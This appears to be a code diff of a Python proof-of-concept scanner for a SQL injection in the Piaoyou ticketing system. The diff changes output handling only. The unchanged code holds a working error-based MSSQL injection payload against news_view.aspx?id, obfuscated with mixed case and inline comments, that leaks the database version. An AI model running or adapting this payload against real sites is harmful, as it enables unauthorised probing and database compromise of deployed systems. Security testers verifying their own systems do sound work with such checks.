@@ -9,8 +9,8 @@ description: 文件/newslist.aspx中,参数newsid存在SQL注入。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class piaoyou_newsview_list_BaseVerify:
     def __init__(self, url):
@@ -25,16 +25,16 @@ class piaoyou_newsview_list_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"BBBMicrosoft" in req.text:
-                cprint("[+]存在票友票务系统通用sql注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在票友票务系统通用sql注入漏洞...(高危)\tpayload: "+vulnurl
 
             vulnurl = self.url + "/news_view.aspx?id=1Or/**/1=CoNvErT(InT,(ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsIoN))--"
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"BBBMicrosoft" in req.text:
-                cprint("[+]存在票友票务系统通用sql注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在票友票务系统通用sql注入漏洞...(高危)\tpayload: "+vulnurl
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = piaoyou_newsview_list_BaseVerify(sys.argv[1])
     testVuln.run()
